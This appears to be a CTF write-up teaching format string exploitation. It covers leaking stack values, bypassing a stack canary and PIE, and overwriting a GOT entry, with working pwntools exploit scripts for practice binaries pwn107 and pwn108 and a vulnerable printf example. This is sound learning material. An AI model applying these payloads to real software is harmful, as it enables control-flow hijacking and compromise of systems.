# Format String
## Finding Our Offset to Input Variable
```
AAAA%x.%x.%x.%x.%x.%x.%x.%x #For 32 bit
AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx #For 64 bit
```

## What is Format Strings Vulnerability

`printf("format strings", variables,...)` takes at least two parameters if the string contains format specifiers or the values will be just taken from the stack or registers.
In general, format string vulnerability happens when the number format specifiers are greater than that of variables specified.

Vulnerable code might looks like the following.
```
char name[32];
printf("Enter your name");
scanf("%s", name);
printf(name); //This is where the code is vulnerable
```
```
lea	rax, [format] //rbp-0x40
mov	rdi, rax
call	printf
```

if we input `%x` in the given prompt, the `printf()` function will be expected to take the value from the stack(if it is 32 bit executable) and echo out the that value in the place of format specifier(`%x`). In the case of 64 bit calling convensions, the values will be taken from the registers(rdi,rsi,rdx,rcx,r8,r9 in order) first before values on the stack are taken. Therefore, to take values from the stack we should input five `%lx`s first before we leak the stack or we can just input `%6$lx` instead (`6$` is positional argument).

Note: values at lower address are printed first but lower significant bytes are printed later (backwards) (<-).
For example
```
7ffc1bc972c0.7fa5e5c8f1f0.5b5858587b4d4854.6465725f67616c66.58585d6465746361.7d58
```
`7ffc1bc972c0` has lower address than `5b5858587b4d4854` but `54` is lower significant byte compared to `48`.

if `5b5858587b4d4854.6465725f67616c66` is a character array, we need to find a way to decode this into ascii text.
```
import binascii
string = "5b5858587b4d4854.6465725f67616c66.58585d6465746361.7d58"
string = string.split('.')
for i in string:
	print(binascii.unhexlify(i)[::-1]) # print(bytes.fromhex(i)[::-1])
```

For 32 bit
```
+----------------------+
|     char name[32]    |
+----------------------+
|     Sensitive Data   |
+----------------------+
|     Sensitive Data   |
+----------------------+ 
|     Sensitive Data   |
+----------------------+ 
|     Sensitive Data   |
+----------------------+  <= esp
|                      | 
```

## Canary Bypass
Canary is usually at `rbp-0x8` on 64 bit processes.

### Exploit pwn107
```
from pwn import *

#context.log_level = "debug"
elf = context.binary = ELF("./pwn107-1644307530397.pwn107", checksec=False)
p = process(["./pwn107-1644307530397.pwn107"])
#gdb.attach(p)

format_str = b"%13$lx.%17$lx"
p.sendlineafter(b"streak? ", format_str)
leaked = p.recv()
leaked = leaked.strip().split(b'\n')[1]
leaked = leaked.split(b" ")[-1]
leaked = leaked.split(b".")

canary = leaked[0]
canary = int(canary.decode("utf-8"),16)
print(hex(canary))

offset = 0x992
elf_base = int(leaked[1].decode("utf-8"),16) - 0x992
get_streak = elf_base + 0x94c

print(hex(elf_base))
print(hex(get_streak))

payload = b"A" * 24
payload += p64(canary)
payload += p64(0x1)
payload += p64(get_streak) # ret address
p.sendline(payload)
p.interactive()
```


## Finding and Calculating Base Addresses for bypassing PIE (Position Independent Executable)

1. Using gdb.attach() in pwntools to debug the code at runtime
```
gdb.attach(target, gdbscript='', exe=None, gdb_args=None, ssh=None, sysroot=None, api=False)
gdb.attach(p)
```

3. input format string input to leak the address

2. Check if the leak address is in the range of libc (if not go back to step 3)
```
(gdb) info proc mappings
```

4. We can find the offset of the leak address by (leak_addr - base_addr_of_libc)

5. When we know the offset to libc we can (leak_addr - offset) to get the base address.

6. We can find the offset of function by `objdump -t file`

7. Once we have successfully calculated the base address we can just add the corresponding offset to get the absolute address
8. When the target is remote system there are websites that calculates the base addresss according to the addresss we input.

## GOT Overwrite
### Exploit
```
from pwn import *

#context.log_level = "debug"

elf = context.binary = ELF("./pwn108-1644300489260.pwn108", checksec=False)
p = process(['./pwn108-1644300489260.pwn108'])
#gdb.attach(p)

#%6$lx 41414141... first input
#%10$lx 42424242... second input
#%23$lx canary


## Locating Our Inputs
#p.sendlineafter(b"=[Your Reg No]: ", b"BBBBBBBB.%10$lx.%23$lx")

# Extract Canary Value Totally Useless For Now
#leaked = p.recv()
#leaked = leaked.strip().split(b"\n")[2]
#leaked = leaked.split(b".")[-1].decode("utf-8")
#leaked = int(leaked,16)
#canary = leaked

print(hex(elf.got['puts']))
print(hex(elf.symbols['holidays'])) #0x40123b 4198971

## First Way (Need Two input)
#p.sendlineafter(b"=[Your name]: ", p64(elf.got['puts']))
#payload = b"%4198971x"
#payload += b"%6$ln"

## Second Way (Only require one input)
#p.sendlineafter(b"=[Your name]: ", b"asdf")
#payload = b"%4198964x......."
#payload += b"%13$ln.."
#payload += p64(elf.got['puts'])

## Third Way (Faster and only require one input)
p.sendlineafter(b"=[Your name]: ", b"AAAAAAAA")
#0x40123b
#0x40 123b
payload = b"%4665x.." #0x123b=4667 $10 4667-2=4665
payload += b"%14$ln.." #$11
 #Note:"%14$ln" itself is counted on the stack but not counted while writing the specified address

payload += b"%3585x.." #0x40 => 0x2040=8256-4667-2-2=3585 $12
payload += b"%15$hhn." #$13

payload += p64(elf.got['puts']) #0x123b $14
payload += p64(elf.got['puts']+2) #0x40 $15

p.sendlineafter(b"=[Your Reg No]: ", payload)

p.interactive()
```

```
+----------------------+
|  elf.got['puts']+2   | <= 15th
+----------------------+
|    elf.got['puts']   | <= 14th
+----------------------+
|        %15$hhn.      | <= 13th
+----------------------+
|        %3585x..      | <= 12th
+----------------------+
|        %14$ln..      | <= 11th
+----------------------+
|        %4665x..      | <= 10th
+----------------------+
|                      |
+----------------------+
|                      |
+----------------------+
|                      |
+----------------------+
|       AAAAAAAA       | <= 6th
+----------------------+
```






